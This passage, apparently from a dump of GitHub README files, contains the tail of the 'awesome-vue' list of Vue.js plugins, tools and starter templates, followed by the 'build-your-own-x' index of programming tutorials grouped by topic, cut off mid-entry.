Vue.js plugin to use webworkers in a simply way.\nvue-log-worker - A Vue.js plugin to log error and vuex mutations to your backend through a web worker\n\nJSX\n\njsx-vue-functional - A Babel plugin that brings syntactic sugar for Vue functional components.\njsx-event-modifiers - A Babel plugin that adds event modifiers similar to Vue templates to JSX.\njsx-v-model - A Babel plugin that brings v-model to JSX.\nvue-jsx-sync - A Babel plugin that brings vue sync modifier to JSX.\n\nMigration\n\nvue-backbone - Vue.js Plugin to facilitate Backbone integration.\n\nWeb Sockets\n\nvue-socket.io - Socket.io implementation for vuejs.\nvue-websocket - Simple websocket (socket.io) plugin for Vue.js.\nvue-echo - Integrates Laravel Echo into Vue, allows for easy registration of socket events.\nvue-socket-cluster - Web Sockets for vue with uws(Micro web sockets) through socket cluster\nvue-native-websocket - Native websocket implementation for Vuejs 2 and Vuex\nvue-socket.io-extended - Socket.io bindings for Vue.js and Vuex\nvue-phoenix - Elixir Phoenix Web Socket implmentation for vuejs. Also provides typescript decorator for better use.\n\nPayment\nPayment utilities.\nStripe\n\nvue-stripe-checkout A simple vue plugin for Stripe checkout.\nvue-stripe-payment Vue wrapper for jquery.payment by Stripe.\n\nPaypal\n\nvue-paypal-checkout A simple Vue.js wrapper component for paypal-checkout.\n\nPlaid\n\nvue-plaid-link Easy to use Vue component for Plaid Link.\n\nIntegrations\nIntegrate with services or other frameworks\n\nvue-disqus - Vue component to integrate Disqus comments in your application, with support for SPA.\nvue-youtube-embed - Vue.js and YouTube.\nvue-add-to-calendar - A Vue.js component that provides \"Add to Calendar\" functionality, works with Vue 2.X.\nVue + Meteor - Vue first-class integration in Meteor.\nav-ts - A modern, type-safe, idiomatic Vue binding library.\nNeutronium - Build .NET desktop applications using HTML, CSS and javascript.\nvue-typescript-jest - Jest preprocessor.js for Vue.js components (supporting html, pug, and babel) and TypeScript.\nvue-jest-utils - Utilities for testing Vue.js components using Jest.\nvue-custom-element - Vue Custom Element - Custom Elements for Vue.js.\nvue-cordova - Vue.js plugin for Cordova.\nvue-wamp - AutobahnJS wrapper library fo Vue.js.\nexpress-vue - Vue rendering engine for Express.js. Use .Vue files as templates using res.render().\nvue-grecaptcha - Google reCAPTCHA for VueJS 2\nvue-recaptcha - Google reCAPTCHA component for Vue.js\nrequire-vuejs - RequireJS plugin to async and dynamic load and parse .vue components.\nfacebook-login-vuejs - Vue Component for Authenticating your Facebook App and get the benefits of Facebook Login.\nvuejs/vuefire - Official Firebase Integration for VueJS\nvuefire - Firebase for VueJS and Vuex\nvue-runkit - RunKit Embed for Vue.js\nvue-youtube - Provides a simple layer for you to use your imagination while over the YouTube IFrame Player API. (Compatible with SSR)\nvue-introjs - Integrates intro.js step-by-step guide and feature introduction with Vue.js http://introjs.com/.\nvue-loopback - Loopback and Vue application template\nvue-laroute - Integrate Laravel routes into your VueJS application using laroute.\nvue-raven - Automatically reports uncaught JavaScript exceptions triggered from vue component.\nvue-telegram-login - Vue Component for Telegram Login by @vchaptsev\nvuexpress - Vue + Express.js = VueXpress / A server side rendering engine for Express.js. Use .vue files as your express.js templates.\nvue-fixer - A simple vue component for the fixer API.\namazon-cognito-vuex-module - Vuex module for Amazon Cognito.\nvue-web3 - Web3 blockchain bindings for Vue.js (inspired by Vuefire and Drizzle)\nsbt-vuefy - Vue.js integration for Playframework\nloopback-vue-starter - LoopBack and Vue starter template with easy plugin management through vue-cli and vue ui.\nvue.py - Write Vue.js Components in Python\nvue-telegram-passport - Vue Component for Telegram Passport by @vchaptsev\nvue-facebook-login-component - A fully customizable component for integrating Facebook login.\nvue-programmatic-invisible-google-recaptcha - A simple invisible Google reCAPTCHA component focused solely on programmatic invocation.\nvbuild - Its main purpose is to let you use components (.vue files) in your vuejs app, without a full nodejs stack. Since 0.6 versions : you can create your component in pure python !\nfeathers-vuex - is a first class integration of the Feathers Client and Vuex. It implements many Redux best practices under the hood, eliminates a lot of boilerplate code, and still allows you to easily customize the Vuex store.\nvue-nocaptcha - Aliyun noCAPTCHA component for Vue.js\nionic-vue - Vue.js integration for Ionic v4\nvue-0xcert - Vue.js integration for 0xcert Framework - an open-source library that provides tools for building powerful decentralized applications\n\nVue CLI 3 Plugins\n\nvue-cli-plugin-cordova - Vue CLI 3 Plugin to add Cordova easily to your project\nvue-cli-plugin-component - Vue CLI 3 Plugin to create component\nvue-cli-plugin-modular-vuex - Vue CLI 3 Plugin to create modular Vuex store files\nvue-cli-plugin-modular-router - Vue CLI Plugin to create modular route files\nvue-cli-plugin-docker-nginx - Vue CLI Plugin to add a docker deployment using a minimal nginx server\nvue-cli-plugin-element - Vue CLI 3 Plugin to build an enterprise application with element-ui in seconds\nvue-cli-plugin-electron-builder - Vue CLI 3 Plugin for Electron with no required configuration that uses Electron Builder.\n\nGoogle Analytics\n\nvue-ua - Google Universal Analytics support in Vue.js.\nvue-analytics - Vue plugin for Google Analytics.\nvue-gtm - Vue plugin for Google Tag Manager\n\nYandex Metrika\n\nvue-ya-metrica - Vue plugin for Yandex.Metrica\nvue-yandex-metrika - Vue plugin for Yandex Metrika with router integration, plugin options by @vchaptsev\n\nDev Tools\n\nvue-dev-server - A small development server for building vue components.\nvuepack.org - A simple page that allows you to select Vue components and download them as a single minified JS file.\nStorybook - The UI Development Environment. works with v3.2+ later.\nFont Awesome Finder - Chrome extension to search, preview and choose Font Awesome icons and copy the selected icon HTML code & Unicode to clipboard.\nvue-dummy - Placeholder Text and Dummy Images as a simple v-dummy directive.\nBit - Manage and reuse vue components between projects. Easily isolate and share components from any project without changing its source code, organize curated collections and install in different projects.\nVuenut - is a component to develop faster and more fluently.\nComponentFixture - is a component design to develop and test other components, automatically binding their props.\n\nInspect\nInspecting & debugging\n\nVue.js devtools - Chrome devtools extension for debugging Vue.js applications.\nDejaVue - Visualization and debugging tool built for Vue.js.\nvue-clicky - Right click any component to show info about it in the console.\nvuejs-logger - Provides customizable logging functionality for Vue.js.\nbugsnag-vue - Official Vue.js plugin for bugsnag error reporting\nvue-inspector - Vue.js Inspector for Mobile Devices\nVue Performance Devtool - Vue Performance Devtool is a browser extension for inspecting the performance of Vue Components\nVueSource - Global Vue mixin which identifies components in source code by adding HTML comments\nNW-Vue-DevTools - DevDependency for adding Vue DevTools into NW.js\nbruit-io - Collect feedbacks with screenshot and technical data and post them to an API like bruit.io.\n\nDocs\nCreate documentation\n\nvue-markdown-loader - Convert Markdown file to Vue Component.\nvue-play - A minimalistic framework for demonstrating your Vue components.\nvue-styleguide-generator - React inspired style guide generator for Vue.js.\nCheatSheet - Complete Interactive API.\nVuex CheatSheet - Complete Interactive Vuex API.\nvue-styleguidist - A style guide generator for Vue components with a living style guide.\nvue-elucidate - A component that generates beautiful documentation for your living styleguide / design system.\nvue-md-loader - Markdown files to ALIVE Vue components.\n@vuedoc/parser - Generate a JSON documentation for a Vue file component.\n@vuedoc/md - Generate a Markdown Documentation for a Vue file.\njsdoc-vue-component - A jsodc3 plugin that extract vue SFC info(name, props, events...) to document.\njsdoc-vuedoc - A jsdoc3 plugin use @vuedoc/md.\nvue-storybook \u2013  Add <story> blocks to your Vue single file components for tighter integration of Vue + Storybook\nvue-patterns - Useful Vue patterns, techniques, tips and tricks and helpful curated links.\nvuese - One-stop solution for vue component documentation.\n\nTest\n\navoriaz - A Vue.js testing utility library.\nvue-container - A simple dependency injection library for Vue 2.\nvuenit - Utilities for testing Vue components and directives.\nvue-unit - A library for Vue.js that makes it easier to create and unit test components.\nvue-a2b - A library for Split Testing with Vue.js. Highly configurable and tiny (1.2k gzipped).\nvue-test-utils - Official utilities for testing Vue components.\nvue-test-actions - Unit testing Vuex actions with Jest mocks.\njest-vue-matcher - Additional jest matchers for vue\nvue-hubble - A better way to select elements for UI testing in Vue.\n\nBrowser-less require\nLoad Vue components without browser\n\nvuegister - Vuegister (a portmanteau of vue & register) is a require hook for loading of the Vue.js single-file components (or .vue files).\nvue-node - Load vue components in node.\n\nSource Code Editing\nText editor plugins\nAtom\n\nlanguage-vue@atom.io - Vue component file syntax for Atom.\nlanguage-vue-component@atom.io - Adds syntax highlighting to Vue Component files in Atom.\nvue-snippets@atom.io - Atom snippets for Vue component files.\nvue-autocompile@atom.io - Auto compile vue file on save.\nlint-sass-vue@atom.io - Atom.io package to lint Sass/SCSS in .vue files.\nvuejs2-snippets@atom.io - Atom snippets for javascript and components, including lifecycle hooks, directives, properties, vuex, vue-router, vue-i18n support.\nvue2-autocomplete@atom.io - Vue.js 2.0+ autocomplete for Atom.\n\nSublime Text\n\nVue Syntax Highlight - Sublime Text syntax highlighting for single-file Vue components.\nVUEFormatter - Sublime Text code format\nvuejs-sublime-complete - Sublime Text code complete\nVue Next Formatter - Sublime Text Vue formatter, Supported ES5/6/7, Less/Sass and Pug/Html template.\n\nVim\n\nVim Vue - Syntax Highlight for Vue.js components.\nvim-vue-plugin - Vim syntax and indent plugin for .vue files.\n\nVisual Studio Code\n\nVetur - Vue tooling for VSCode.\n\nVisual Studio\n\nVuePack - Contains HTML Intellisense and code snippets for the Vue.js JavaScript library.\n\nBrackets\n\nBrackets Vue - Brackets extension for Vue.js.\n\nIntellij\n\nVue.js Plugin - Vue.js features for the Intellij Platform (WebStorm, RubyMine, Intellij, etc).\nVue.js support for WebStorm, IntelliJ IDEA, PhpStorm, PyCharm & RubyMine \u2013 official Vue.js support by JetBrains\n\nEmacs\n\nVue Mode - Emacs major mode for vue.js.\n\nKate\n\nKate Syntax Files - Syntax files (modified or original) for katepart (kate, kwrite, kdevelop).\n\nScaffold\nScaffold / boilerplate / seed / starter kits / stack ensemble / Yeoman generator\n\nvue-cli - Simple CLI for scaffolding Vue.js projects.\nVue-Django - A boilerplate to set you up in bringing the awesomeness of VueJS into a Django (Python) app.\npython-vuejs - Gluing Python web frameworks and Vue.js with a set of scripts. Basically a vue-cli wrapper.\ngenerator-vue-plugin - Yeoman generator generating vue plugin.\nvue-seed - vue-seed is minimal seed for those looking to get up-and-running with Vue\nnuxt-seed - nuxt-seed is minimal seed for those looking to get up-and-running with Vue and Nuxt\nrails_vue_melt - Rails view with webpack=vue optimizer.\nvue-starter - A Vue.js starter kit that lets you focus on more programming and less configuration.\nvue-standalone-component - A standalone component generator with documentation support using jsdoc and vue-styleguidist\nvuejs-wordpress-theme-starter - A WordPress theme with the guts ripped out and replaced with Vue\nCordovue - A sample Apache Cordova application using Vue.\nCookiecutter-Django-Vue - Django+VueJS+Docker customizable project generator with a large number of settings/integrations by @vchaptsev\niBiu   A visual CLI for scaffolding large Vue projects in 2 seconds.\nwp-vue - A simple Vue blog template that displays posts from a WordPress REST API endpoint.\nvue-cli-template-nativescript - Template for starting new nativescript+vue projects with rollup+babel+eslint\nvue-element-ui-scaffold - Online and visual Vue 2 with Element-UI CRUD scaffold/generator.\nvue-firebase-element-ui-scaffold - Online and visual Vue 2, Element-UI and Firebase scaffold/generator with CRUDs, authentication, file/image upload, activity log and more.\nvue-starter - an enterprise ready boilerplate for isomorphic, progressive web apps with Vue.JS\nvue-vuex-typescript-webpack-seed - A seed project with Vue, Vuex, Typescript, Scss & Webpack with hot reloading\nVueCharged Template - A highly opinionated, feature-first Vue 2 template with CLI scaffolding. Uses Vue 2, Vuex, Vue Router and Vue I18n.\nHuncwot - Vue.js boilerplate with Node.js for building modern JavaScript applications with \u00ab batteries included \u00bb approach.\nwemake-vue-template - Bleeding edge vue template focused on code quality and developer happiness. Featuring: nuxt, flow, and jest.\nvue-lib-template - \ud83d\udee0 A simple template for building and publishing Vue component/library as a opensource.\nAwesome Vue Boilerplate - \ud83d\ude0d Awesome Vue, \ud83e\udd70 Vuex, Vuex-pathify, element-ui, tailwindcss\nScaffoldHub.io - Generate full Vue applications with SQL, MongoDB or Firebase Firestore databases.\nVuePlay - Generate disposable Vue playgrounds in seconds. Allows you to test things quickly.\n\nClient\nRender Vue application in the browser only\n\nVue Plugin Boilerplate - Boilerplate for Vue.js plugin.\nBourgeon - Bourgeon is an opinionated-featured VueJS 2.0 setup for Webpack.\nVuePack - A modern starter which uses Vue 2, Vuex, Vue-router and Webpack 2 (and even Electron).\nVue Settler - An opinionated Vue 2.0 SPA Starter.\nvue-build - Ultra Simple, Development, Testing and Production Build Cli.\nVue Element Starter - Robust Vue 2 starter with Element-UI.\nvue-multiple-pages - A modern Vue.js multiple pages starter which uses Vue 2, Webpack2, and Element-UI\nvue-typescript-boilerplate - A Vue.js typescript SPA starter with Vue 2, Vue Typed, Vuex, Vue Router and localization\nvue-tachyons-template - A Vue 2 project starter template w/ Tachyons, Webpack, and ESLint\nVuets - A Vue, TypeScript ready boilerplate using class-style components, vue plugin options, webpack & vue-cli.\nMMF-FE/vue-typescript - A vue2.x typescript template.\nFriendly Vue Starter - A full featured Vue.js starter project with GraphQL support via Apollo-client (Vuex, Vue-router, Vue-i18n, Webpack 3, Eslint, Prettier, ...)\nvue-webpack-typescript - A Vue 2.2 Webpack 2 and Typescript 2 setup with hot reload, unit testing, code coverage, sass and bundling/minification.\nvue-ts-amd - A full-featured Vue.js 2 boilerplate using AMD pattern (RequireJS) and Typescript.\nvue-2-boilerplate - Vue 2 boilerplate for developing medium to large single page applications by petervmeijgaard\nlayout - A full-featured Webpack + Vue Extend layout\nlayout-simple - A simple Webpack + Vue Extend layout\nvue-cli-template-library - Template for developing open-source vue.js libraries with Rollup + Jest + Babel + Storybook + TravisCI + SemanticRelease.\nvue-cli-template-github-pages - A full-featured Webpack + vue-loader setup for Github Pages Deployment with travisCI.\nvue-webpack-chrome-extension-template - Template for quick creation of Chrome extension on Vuejs hot reloading when developing.\nbuildless-vue - Quickly use Vue without a build step.\nvue-component-template - Webpack setup for building & publishing a Vue component/library (with docs/demo site).\nvue-auth-boilerplate - Vue SPA boilerplate with Router/Vuex/CLI3 and auth functions (cool looking register and login). Works with minimal setup out of the box with laravel-api-boilerplate-jwt.\n\nUniversal\nRender Vue application to HTML on the server and to the DOM in the browser\n\nSPA Starter Kit - A highly opinionated starter kit for building Single Page Applications with Laravel and Vue.js.\nSSR Boilerplate - Vue.js Server Side Rendering Boilerplate without Polluting Vuex.\nneutrino-preset-vue-static - A minimalistic starter kit for building static sites using Vue.js.\nVueniverse - A fully featured, universal Vue template for user-based applications, powered by Nuxt.js and Express.\nvue-preload - A plugin Vue for adding <link rel=\"preload\" capabilities\n\nServer\nIncludes a backend boilerplate\n\nVuetober - Single page apps with Laravel, Vue.js, and October CMS.\nToucan - Boilerplate for building single page apps. Server is multi-project .Net Core solution designed around SOLID principles. Client is TypeScript 2, Vuejs 2, Vuex 2.\nvue-server-demo - Writing koa server in Vue.\nvue-apollo-connector-kit - JWT authentication with 2 different strategies (localStorage and httpOnly cookies). Authorization using custom directives (apollo).\nDotVue - Implement .vue file handler in .NET with server ViewModel postback. Single-file components with server-side ViewModel. Use all power of VueJS with simple C# server side data access.\n\nElectron\n\nElectron Vue - An Electron & Vue.js quick start boilerplate with vue-cli scaffolding, common Vue plugins, electron-packager/electron-builder, unit/e2e testing, vue-devtools, and webpack.\nVuePack - A modern starter which uses Vue 2, Vuex, Vue-router and Webpack 2 (and even Electron).\nvue-flexible-link - Tiny Vue component for Electron to open links in a browser. Ideal for cross environment apps (Web & Native)\nvuelectron - electronjs starter kits for vue.\nvue-design - the best website visualization builder with Vue and Electron.\nvue-cli-plugin-electron-builder - A Vue Cli 3 plugin for Electron with no required configuration that uses Electron Builder and Electron Webpack.\ndapp - Boilerplate for stack of Vue/Parcel/Electron.\nvue-electron-template - An Electron & Vue.js boilerplate with Hot-reloading enabled and common Vue plugins, dev and build scripts configured using webpack-4\n\nParts\nScaffold parts of the app\n\nvue-generator - A CLI generator for Vue components, views and store modules.\nvue-component-generator - A generator for vue component, supports Vue1.X and Vue2.X.\nrapydml_cmp - Vue-component pythonic generator, built on top of RapydML & RapydScript.\nvue-authoring-template - Template for authoring also publishing Vue component and their use case in story-scenario (storybook) format in easy way.\nvue-component-boilerplate - Template for generating the boilerplate code for a VueJS components, with build scripts and testing pre-installed.\nvue-generate-component-typescript - A typescript code generator for vue, it can generate components, directives, filters.\n\nRuntime\nCommand Line / Terminal\n\nblessed-vue - A VueJS runtime to let you write command line UI in Vue Edit\n\nPrerendering\n\nreact-snap - A zero-configuration static pre-renderer for SPA\nprerender-plugin - A Node.js/ webpack plugin to prerender static HTML in a single-page application (SPA).\nvue-prerender - A Vue.js tailored plugin which implements three strategies for prerendering Vue.js pages using headless chrome.\nRendora - dynamic SSR (server-side rendering) using headless Chrome to effortlessly solve the SEO problem for modern javascript websites"}, {"title": "danistefanovic/build-your-own-x", "language": "JavaScript", "content": "[Submit tutorial]\n\nTable of contents\n\n3D Renderer\nAugmented Reality\nBitTorrent Client\nBlockchain / Cryptocurrency\nBot\nCommand-Line Tool\nDatabase\nDocker\nEmulator / Virtual Machine\nFront-end Framework / Library\nGame\nGit\nNetwork Stack\nNeural Network\nOperating System\nPhysics Engine\nProgramming Language\nRegex Engine\nSearch Engine\nShell\nTemplate Engine\nText Editor\nVisual Recognition System\nVoxel Engine\nWeb Search Engine\nWeb Server\nUncategorized\n\nTutorials\nBuild your own 3D Renderer\n\nC++: Introduction to Ray Tracing: a Simple Method for Creating 3D Images\nC++: How OpenGL works: software rendering in 500 lines of code\nC++: Raycasting engine of Wolfenstein 3D\nC++: Physically Based Rendering:From Theory To Implementation\nC++: Rasterization: a Practical Implementation\nC# / TypeScript / JavaScript: Learning how to write a 3D soft engine from scratch in C#, TypeScript or JavaScript\nJava / JavaScript: Build your own 3D renderer\nJava: How to create your own simple 3D render engine in pure Java\nJavaScript / Pseudocode: Computer Graphics from scratch\nPython: A 3D Modeller\n\nBuild your own Augmented Reality\n\nC#: How To: Augmented Reality App Tutorial for Beginners with Vuforia and Unity 3D [video]\nC#: Windows Mixed Reality Academy [video]\nC#: How To Unity ARCore [video]\nC#: AR Portal Tutorial with Unity [video]\nC#: How to create a Dragon in Augmented Reality in Unity ARCore [video]\nC#: How to Augmented Reality AR Tutorial: ARKit Portal to the Upside Down [video]\nPython: Augmented Reality with Python and OpenCV\n\nBuild your own BitTorrent Client\n\nC#: Building a BitTorrent client from scratch in C#\nNim: Writing a Bencode Parser\nNode.js: Write your own bittorrent client\nPython: A BitTorrent client in Python 3.5\n\nBuild your own Blockchain / Cryptocurrency\n\nATS: Functional Blockchain\nC#: Programming The Blockchain in C#\nCrystal: Write your own blockchain and PoW algorithm using Crystal\nGo: Building Blockchain in Go\nGo: Code your own blockchain in less than 200 lines of Go\nGo: Building A Simple Blockchain with Go\nJava: Creating Your First Blockchain with Java\nJavaScript: A cryptocurrency implementation in less than 1500 lines of code\nJavaScript: Build your own Blockchain in JavaScript\nJavaScript: Learn & Build a JavaScript Blockchain\nJavaScript: Creating a blockchain with JavaScript [video]\nJavaScript: How To Launch Your Own Production-Ready Cryptocurrency\nKotlin: Let\u2019s implement a cryptocurrency in Kotlin\nPython: Learn Blockchains by Building One\nPython: Build your own blockchain: a Python tutorial\nPython: A Practical Introduction to Blockchain with Python\nPython: Let\u2019s Build the Tiniest Blockchain\nRuby: Programming Blockchains Step-by-Step (Manuscripts Book Edition)\nScala: How to build a simple actor-based blockchain\nTypeScript: Naivecoin: a tutorial for building a cryptocurrency\nTypeScript: NaivecoinStake: a tutorial for building a cryptocurrency with the Proof of Stake consensus\n\nBuild your own Bot\n\nHaskell: Roll your own IRC bot\nJava: How To Make a Scary Russian Twitter Bot With Java\nNode.js: Creating a Simple Facebook Messenger AI Bot with API.ai in Node.js\nNode.js: How to make a responsive telegram bot\nNode.js: Create a Discord bot\nNode.js: gifbot - Building a GitHub App\nNode.js: Building A Simple AI Chatbot With Web Speech API And Node.js\nPython: Chatbot Fundamentals: An interactive guide to writing bots in Python\nPython: How to Build Your First Slack Bot with Python\nPython: How to build a Slack Bot with Python using Slack Events API & Django under 20 minute\nPython: Build a Reddit Bot\nPython: How To Make A Reddit Bot [video]\nPython: How To Create a Telegram Bot Using Python\nPython: Create a Twitter Bot in Python Using Tweepy\nPython: Creating Reddit Bot with Python & PRAW [video]\nR: Build A Cryptocurrency Trading Bot with R\nRust: A bot for Starcraft in Rust, C or any other language\n\nBuild your own Command-Line Tool\n\nC: Rewriting the cat command from scratch [video]\nGo: Visualize your local git contributions with Go\nGo: Build a command line app with Go: lolcat\nGo: Building a cli command with Go: cowsay\nGo: Go CLI tutorial: fortune clone\nNim: Writing a stow alternative to manage dotfiles\n\nBuild your own Database\n\nC: Let's Build a Simple Database\nC++: Implementing a Key-Value Store\nC#: Build Your Own Database\nClojure: An Archaeology-Inspired Database\nCrystal: Why you should build your own NoSQL Database\nJavaScript: Dagoba: an in-memory graph database\nPython: DBDB: Dog Bed Database\nPython: Write your own miniature Redis with Python\n\nBuild your own Docker\n\nC: Linux containers in 500 lines of code\nC++: Creating your own containers\nGo: Building a container from scratch in Go [video]\nPython: A workshop on Linux containers: Rebuild Docker from Scratch\nPython: A proof-of-concept imitation of Docker, written in 100% Python\nShell: Docker implemented in around 100 lines of bash\n\nBuild your own Emulator / Virtual Machine\n\nC: Virtual machine in C\nC: Write your Own Virtual Machine\nC: Writing a Game Boy emulator, Cinoop\nC++: How to write an emulator (CHIP-8 interpreter)\nC++: Emulation tutorial (CHIP-8 interpreter)\nC++: Emulation tutorial (GameBoy emulator)\nC++: Emulation tutorial (Master System emulator)\nCommon Lisp: CHIP-8 in Common Lisp\nJavaScript: GameBoy Emulation in JavaScript\nPython: Emulation Basics: Write your own Chip 8 Emulator/Interpreter\n\nBuild your own Front-end Framework / Library\n\nJavaScript: WTF is JSX (Let's Build a JSX Renderer)\nJavaScript: A DIY guide to build your own React\nJavaScript: Reverse Engineering React [video]\nJavaScript: Building React From Scratch [video]\nJavaScript: Building Your Own React Clone in Five Easy Steps\nJavaScript: Gooact: React in 160 lines of JavaScript\nJavaScript: React Internals\nJavaScript: Learn how React Reconciler package works by building your own lightweight React DOM\nJavaScript: Build Yourself a Redux\nJavaScript: Let\u2019s Write Redux!\nJavaScript: Redux: Implementing Store from Scratch [video]\nJavaScript: Build Your own Simplified AngularJS in 200 Lines of JavaScript\nJavaScript: Make Your Own AngularJS\nJavaScript: How to write your own Virtual DOM\nJavaScript: Building a frontend framework, from scratch, with components (templating, state, VDOM)\n\nBuild your own Game\n\nC: Handmade Hero\nC: How to Program an NES game in C\nC: Chess Engine In C [video]\nC: Let's Make: Dangerous Dave [video]\nC: Learn Video Game Programming in C\n[video]\nC: Coding A Sudoku Solver in C [video]\nC: Coding a Rogue/Nethack RPG in C [video]\nC: Tutorial For a Brickout Clone\nC: A tutorials for a basic Invaders game made in C with GTK: and OpenGL\nC: Astroids Tutorial written in C using GTK with OpenGL and DashGL for matrix manipulation\nC: On Tetris and Reimplementation\nC++: Breakout\nC++: Beginning Game Programming v2.0\nC++: Tetris tutorial in C++ platform independent focused in game logic for beginners\nC++: Remaking Cavestory in C++ [video]\nC++: Reconstructing Cave Story [video]\nC++: Space Invaders from Scratch\nC#: Learn C# by Building a Simple RPG\nC#: Creating a Roguelike Game in C#\nC#: Build a C#/WPF RPG\nGo: Games With Go [video]\nJava: 3D Game Development with LWJGL 3\nJavaScript: 2D breakout game using Phaser\nJavaScript: How to Make Flappy Bird in HTML5 With Phaser\nJavaScript: Developing Games with React, Redux, and SVG\nJavaScript: Build your own 8-Ball Pool game from scratch [video]\nJavaScript: How to Make Your First Roguelike\nJavaScript: Think like a programmer: How to build Snake using only JavaScript, HTML & CSS\nLua: BYTEPATH\nPython: Developing Games With PyGame\nPython: Making Games with Python & Pygame [pdf]\nPython: The Complete Roguelike Tutorial [video]\nPython: Roguelike Tutorial Revised\nRuby: Developing Games With Ruby\nRuby: Ruby Snake\nRust: Adventures in Rust: A Basic 2D Game\nRust: Roguelike Tutorial in Rust + tcod\n\nBuild your own Git\n\nHaskell: Reimplementing \u201cgit clone\u201d in Haskell from the bottom up\nJavaScript: Gitlet\nJavaScript: Build GIT - Learn GIT\nPython: Just enough of a Git client to create a repo, commit, and push itself to GitHub\nRuby: Rebuilding Git in Ruby\n\nBuild your own Network Stack\n\nC: Beej's Guide to Network Programming\nC: Let's code a TCP/IP stack\nRuby: How to build a network stack in Ruby\n\nBuild your own Neural Network\n\nC#: Neural Network OCR\nF#: Building Neural Networks in F#\nGo: Build a multilayer perceptron with Golang\nGo: How to build a simple artificial neural network with Go\nGo: Building a Neural Net from Scratch in Go\nJavaScript / Java: Neural Networks - The Nature of Code [video]\nJavaScript: Neural Network implementation in JavaScript, by an example\nJavaScript: Neural networks from scratch for JavaScript linguists (Part1\u200a\u2014\u200aThe Perceptron)\nPython: A Neural Network in 11 lines of Python\nPython: Implement a Neural Network from Scratch\nPython: Optical Character Recognition (OCR)\nPython: Traffic signs classification with a convolutional network\nPython: Generate Music using LSTM Neural Network in Keras\n\nBuild your own Operating System\n\nAssembly: Writing a Tiny x86 Bootloader\nAssembly: Baking Pi \u2013 Operating Systems Development\nC: Building a software and hardware stack for a simple computer from scratch [video]\nC: Operating Systems: From 0 to 1\nC: The little book about OS development\nC: Roll your own toy UNIX-clone OS\nC: Kernel 101 \u2013 Let\u2019s write a Kernel\nC: Kernel 201 \u2013 Let\u2019s write a Kernel with keyboard and screen support\nC: Build a minimal multi-tasking kernel for ARM from scratch\nC: How to create an OS from scratch\nC: Malloc tutorial\nC: Hack the virtual memory\nC: Learning operating system development using Linux kernel and Raspberry Pi\nC: Operating systems development for Dummies\nC++: Write your own Operating System [video]\nC++: Writing a Bootloader\nRust: Writing an OS in Rust\n\nBuild your own Physics Engine\n\nC: Video Game Physics Tutorial\nC++: Game physics series by Allen Chou\nC++: How to Create a Custom Physics Engine\nC++: Game physics series by Glenn Fiedler\nC++: 3D Physics Engine Tutorial [video]\nC#: TowerFall Physics\nJavaScript: Build your own basic physics engine in JavaScript\nJavaScript: How Physics Engines Work\nJavaScript: Broad Phase Collision Detection Using Spatial Partitioning\nJavaScript: Build a simple 2D physics engine for JavaScript games\n\nBuild your own Programming Language\n\n(any): mal - Make a Lisp\nAssembly: Jonesforth\nC: Baby's First Garbage Collector\nC: Build Your Own Lisp: Learn C and build your own programming language in 1000 lines of code\nC: Writing a Simple Garbage Collector in C\nC: C interpreter that interprets itself.\nC: A C & x86 version of the \"Let's Build a Compiler\" by Jack Crenshaw\nC++: Writing Your Own Toy Compiler Using Flex\nC++: How to Create a Compiler [video]\nC++: Kaleidoscope: Implementing a Language with LLVM\nF#: Understanding Parser Combinators\nElixir: Demystifying compilers by writing your own [video]\nGo: The Super Tiny Compiler\nGo: Lexical Scanning in Go [video]\nHaskell: Let's Build a Compiler\nHaskell: Write You a Haskell\nHaskell: Write Yourself a Scheme in 48 Hours\nHaskell: Write You A Scheme\nJava: Crafting interpreters: A handbook for making programming languages\nJava: Creating JVM Language\nJavaScript: The Super Tiny Compiler\nJavaScript: The Super Tiny Interpreter\nJavaScript: Little Lisp interpreter\nJavaScript: How to implement a programming language in JavaScript\nOCaml: Writing a C Compiler\nOCaml: Writing a Lisp, the series\nPascal: Let's Build a Compiler\nPython: A Python Interpreter Written in Python\nPython: lisp.py: Make your own Lisp interpreter\nPython: Simple Iterator-based Parsing\nPython: Simple Top-Down Parsing in Python\nPython: How to Write a Lisp Interpreter in Python\nPython: Let\u2019s Build A Simple Interpreter\nPython: Make Your Own Simple Interpreted Programming Language [video]\nRacket: Beautiful Racket: How to make your own programming languages with Racket\nRuby: A Compiler From Scratch\nRuby: Markdown compiler from scratch in Ruby\nRust: So You Want to Build a Language VM\nSwift: Building a LISP from scratch with Swift\n\nBuild your own Regex Engine\n\nC: A Regular Expression Matcher\nC: Regular Expression Matching Can Be Simple And Fast\nJavaScript: Build a Regex Engine in Less than 40 Lines of Code\nJavaScript: How to implement regular expressions in functional javascript using derivatives\nPerl: How Regexes Work\nScala: No Magic: Regular Expressions\n\nBuild your own Search Engine\n\nCSS: A search engine in CSS\nPython: Building a search engine using Redis and redis-py\nPython: Building a Vector Space Indexing Engine in Python\nPython: Building A Python-Based Search Engine [video]\nPython: Making text search learn from feedback\nPython: Finding Important Words in Text Using TF-IDF\n\nBuild your own Shell\n\nC: Tutorial - Write a Shell in C\nC: Let's build a shell!\nC: Writing a UNIX Shell\nC: Build Your Own Shell\nGo: Writing a simple shell in Go\nRuby: A Unix Shell in Ruby\nRust: Build Your Own Shell using Rust\n\nBuild your own Template Engine\n\nJavaScript: JavaScript template engine in just 20 lines\nJavaScript: Understanding JavaScript Micro-Templating\nPython: Approach: Building a toy template engine in Python\nPython: A Template Engine\nRuby: How to write a template engine in less than 30 lines of code\n\nBuild your own Text Editor\n\nC: Build Your Own Text Editor\nC++: Designing a Simple Text Editor\nPython: Python Tutorial: Make Your Own Text Editor [video]\nPython: Create a Simple Python Text Editor!\nRuby: Build a Collaborative Text Editor Using Rails\n\nBuild your own Visual Recognition System\n\nPython: Developing a License Plate Recognition System with Machine Learning in Python\nPython: Building a Facial Recognition Pipeline with Deep Learning in Tensorflow\n\nBuild your own Voxel Engine\n\nC++: Let's Make a Voxel Engine\nJava: Let's make a voxel engine [video]\nJava: Java Voxel Engine Tutorial [video]\n\nBuild your own Web Search Engine\n\nPHP: Code a Search Engine in PHP\nRuby: Write an Internet search engine with 200 lines of Ruby code\n\nBuild your own Web Server\n\nC#: Writing a Web Server from Scratch\nNode.js: Let's code a web server from scratch with NodeJS Streams\nNode.js: lets-build-express\nPHP: Writing a webserver in pure PHP\nPython: A Simple Web Server\nPython: Let\u2019s Build A Web Server.\nPython: Web application from scratch\nPython: Building a basic HTTP Server from scratch in Python\nPython: Implementing a RESTful Web API with Python & Flask\nRuby: Building a simple websockets server from scratch in Ruby\n\nUncategorized\n\n(any): From NAND to Tetris: Building a Modern Computer From First Principles\nAlloy: The Same-Origin Policy\nC: How to Write a Video Player in Less 